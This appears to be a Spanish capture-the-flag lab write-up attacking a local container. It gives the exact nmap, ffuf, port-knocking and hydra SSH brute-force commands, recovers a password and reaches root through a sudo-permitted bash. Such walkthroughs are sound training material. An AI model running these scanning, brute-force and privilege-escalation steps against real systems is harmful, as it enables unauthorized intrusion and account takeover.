Fecha: 14/08/2024

Empiezo haciendo un nmap, obteniendo un Apache no vulnerable en el puerto 80
```
sudo nmap -p- -sS -sC -sV --min-rate 5000 -n -Pn 172.17.0.2 -oN scan
```

No veo nada en la página, así que hago fuzzing:

```
ffuf -c -recursion -w /usr/share/wordlists/directory-list-2.3-medium.txt -u http://172.17.0.2/FUZZ  -e .php,.html,.txt,.js,.py -o fuzzing
```


Uno de los resultados es http://172.17.0.2/qdefense.txt, en el cual se ve lo siguiente:

![](Imágenes/Pasted%20image%2020240814194226.png)
Esos números y el toc-toc me hacen pensar que hay algun tipo de port knocking para activar cierto servicio, voy a probarlo: 

```
knock 172.17.0.2 7000 8000 9000
```

Al hacer nmap de nuevo, encuentro que se ha abierto el puerto 22: 
![](Imágenes/Pasted%20image%2020240814194701.png)

Me tiene pinta de que el nombre puede ser para hacer algo de OSINT, así que lo busco en el browser. No encuentro nada al respecto, así que probaré a buscar una contraseña para `tocotoc` con hydra: 

```
hydra -P /usr/share/wordlists/rockyou.txt  -l toctoc ssh://172.17.0.2 -t 64     
```

![](Imágenes/Pasted%20image%2020240814195243.png)

Encuentro la contraseña `kittycat`. Lo primero que hago es mirar `sudo -l`, y encuentro dos funciones que podría usar como root: 

![](Imágenes/Pasted%20image%2020240814195425.png)

Simplemente usando el bash tendré una terminal con permisos de superusuario: 

![](Imágenes/Pasted%20image%2020240814195533.png)
